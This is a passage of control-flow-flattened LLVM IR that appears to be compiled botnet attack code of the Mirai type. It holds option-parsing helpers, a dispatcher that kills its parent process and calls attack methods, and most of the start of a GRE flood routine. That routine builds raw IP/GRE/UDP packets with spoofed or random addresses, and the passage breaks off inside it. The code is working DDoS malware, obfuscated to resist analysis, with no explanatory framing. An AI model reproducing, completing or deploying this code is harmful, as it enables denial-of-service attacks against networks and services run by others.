  %29 = select i1 %28, i32 2118970170, i32 -343784864
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %14, align 4
  %33 = icmp eq i32 %32, 0
  %34 = select i1 %33, i32 999790695, i32 44950895
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @sleep(i32 %36)
  %38 = call i32 @getppid() #6
  %39 = call i32 @kill(i32 %38, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %15, align 4
  store i32 -174947249, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %15, align 4
  %43 = load i8, i8* @methods_len, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp slt i32 %42, %44
  %46 = select i1 %45, i32 -889513621, i32 -467500100
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %48, i64 %50
  %52 = load %struct.attack_method*, %struct.attack_method** %51, align 8
  %53 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %52, i32 0, i32 1
  %54 = load i8, i8* %53, align 8
  %55 = zext i8 %54 to i32
  %56 = load i8, i8* %8, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %55, %57
  %59 = select i1 %58, i32 -293267133, i32 1234162732
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %61, i64 %63
  %65 = load %struct.attack_method*, %struct.attack_method** %64, align 8
  %66 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %65, i32 0, i32 0
  %67 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %66, align 8
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %70 = load i8, i8* %11, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %67(i8 zeroext %68, %struct.attack_target* %69, i8 zeroext %70, %struct.attack_option* %71)
  store i32 -467500100, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -610544250, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %15, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %15, align 4
  store i32 -174947249, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %73, %72, %60, %47, %41, %40, %31, %25, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %.reg2mem = alloca %struct.attack_option*
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  store %struct.attack_option* %6, %struct.attack_option** %.reg2mem
  %switchVar = alloca i32
  store i32 1531617040, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1531617040, label %first
    i32 1955806124, label %9
    i32 -1829425854, label %10
    i32 -418456107, label %11
    i32 -240468755, label %16
    i32 -771983288, label %25
    i32 1481200618, label %32
    i32 -290864299, label %33
    i32 1153502171, label %36
    i32 -970378303, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.attack_option*, %struct.attack_option** %.reg2mem
  %7 = icmp eq %struct.attack_option* %.reload, null
  %8 = select i1 %7, i32 1955806124, i32 -1829425854
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i32 -970378303, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -418456107, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %12, %13
  %15 = select i1 %14, i32 -240468755, i32 1153502171
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 -771983288, i32 1481200618
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i64 %28
  %30 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %29, i32 0, i32 0
  %31 = load i8*, i8** %30, align 8
  call void @free(i8* %31) #6
  store i32 1481200618, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -290864299, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %5, align 4
  store i32 -418456107, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  store i32 -970378303, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %33, %32, %25, %16, %11, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -489681476, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -489681476, label %11
    i32 -961406621, label %17
    i32 -1301265950, label %29
    i32 3824088, label %36
    i32 -1519663583, label %37
    i32 -120691623, label %40
    i32 -515452655, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  %16 = select i1 %15, i32 -961406621, i32 -120691623
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i64 %20
  %22 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %21, i32 0, i32 1
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %8, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  %28 = select i1 %27, i32 -1301265950, i32 3824088
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %30, i64 %32
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %5, align 8
  store i32 -515452655, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 -1519663583, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  store i32 -489681476, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  store i32 -515452655, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  ret i8* %43

loopEnd:                                          ; preds = %40, %37, %36, %29, %17, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -387297190, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -387297190, label %first
    i32 2071472258, label %18
    i32 1020384003, label %20
    i32 -1463652896, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 2071472258, i32 1020384003
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 -1463652896, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @util_atoi(i8* %21, i32 10)
  store i32 %22, i32* %5, align 4
  store i32 -1463652896, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -1710628231, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1710628231, label %first
    i32 527284008, label %18
    i32 460445605, label %20
    i32 1078829579, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 527284008, i32 460445605
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 1078829579, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @inet_addr(i8* %21) #6
  store i32 %22, i32* %5, align 4
  store i32 1078829579, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1332528792, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1332528792, label %first
    i32 999349766, label %79
    i32 -1662759703, label %80
    i32 879967955, label %86
    i32 1112955226, label %89
    i32 1194510270, label %90
    i32 1334894828, label %96
    i32 -1450340608, label %147
    i32 1297301240, label %151
    i32 91834696, label %201
    i32 -560796183, label %205
    i32 -1524436275, label %214
    i32 1522012813, label %220
    i32 -403980106, label %228
    i32 -1739833981, label %244
    i32 748880056, label %247
    i32 -545389281, label %248
    i32 931426249, label %249
    i32 927521685, label %255
    i32 702209612, label %284
    i32 -1091992897, label %305
    i32 1227524933, label %309
    i32 1771241489, label %313
    i32 -1312038723, label %318
    i32 -588745701, label %333
    i32 -1028033286, label %338
    i32 566621988, label %344
    i32 699642041, label %349
    i32 1371512185, label %355
    i32 -227996643, label %359
    i32 406136144, label %363
    i32 174353573, label %369
    i32 -1518783782, label %373
    i32 786831969, label %376
    i32 1090740823, label %443
    i32 2058167161, label %446
    i32 -1288758756, label %447
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %77 = icmp eq i32 %.reload, -1
  %78 = select i1 %77, i32 999349766, i32 -1662759703
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 -1288758756, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %81 = load i32, i32* %10, align 4
  %82 = bitcast i32* %9 to i8*
  %83 = call i32 @setsockopt(i32 %81, i32 0, i32 3, i8* %82, i32 4) #6
  %84 = icmp eq i32 %83, -1
  %85 = select i1 %84, i32 879967955, i32 1112955226
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = call i32 @close(i32 %87)
  store i32 -1288758756, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1194510270, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %9, align 4
  %92 = load i8, i8* %5, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  %95 = select i1 %94, i32 1334894828, i32 748880056
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %98 = load i8**, i8*** %11, align 8
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8*, i8** %98, i64 %100
  store i8* %97, i8** %101, align 8
  %102 = load i8**, i8*** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  %106 = load i8*, i8** %105, align 8
  %107 = bitcast i8* %106 to %struct.iphdr*
  store %struct.iphdr* %107, %struct.iphdr** %22, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i64 1
  %110 = bitcast %struct.iphdr* %109 to %struct.grehdr*
  store %struct.grehdr* %110, %struct.grehdr** %23, align 8
  %111 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %112 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %111, i64 1
  %113 = bitcast %struct.grehdr* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = and i8 %119, 15
  %121 = or i8 %120, 64
  store i8 %121, i8* %118, align 4
  %122 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, -16
  %126 = or i8 %125, 5
  store i8 %126, i8* %123, align 4
  %127 = load i8, i8* %12, align 1
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 1
  store i8 %127, i8* %129, align 1
  %130 = load i32, i32* %18, align 4
  %131 = sext i32 %130 to i64
  %132 = add i64 52, %131
  %133 = trunc i64 %132 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %13, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %15, align 1
  %145 = icmp ne i8 %144, 0
  %146 = select i1 %145, i32 -1450340608, i32 1297301240
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 4
  store i16 %148, i16* %150, align 2
  store i32 1297301240, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 47, i8* %153, align 1
  %154 = load i32, i32* %21, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 8
  store i32 %154, i32* %156, align 4
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i32 %162, i32* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %166 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %167 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, 15
  %172 = or i8 %171, 64
  store i8 %172, i8* %169, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, -16
  %177 = or i8 %176, 5
  store i8 %177, i8* %174, align 4
  %178 = load i8, i8* %12, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 1
  store i8 %178, i8* %180, align 1
  %181 = load i32, i32* %18, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 28, %182
  %184 = trunc i64 %183 to i16
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 2
  store i16 %185, i16* %187, align 2
  %188 = load i16, i16* %13, align 2
  %189 = zext i16 %188 to i32
  %190 = xor i32 %189, -1
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 3
  store i16 %192, i16* %194, align 4
  %195 = load i8, i8* %14, align 1
  %196 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 5
  store i8 %195, i8* %197, align 4
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  %200 = select i1 %199, i32 91834696, i32 -560796183
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  store i32 -560796183, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 17, i8* %207, align 1
  %208 = call i32 @rand_next()
  %209 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load i8, i8* %20, align 1
  %212 = icmp ne i8 %211, 0
  %213 = select i1 %212, i32 -1524436275, i32 1522012813
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 9
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
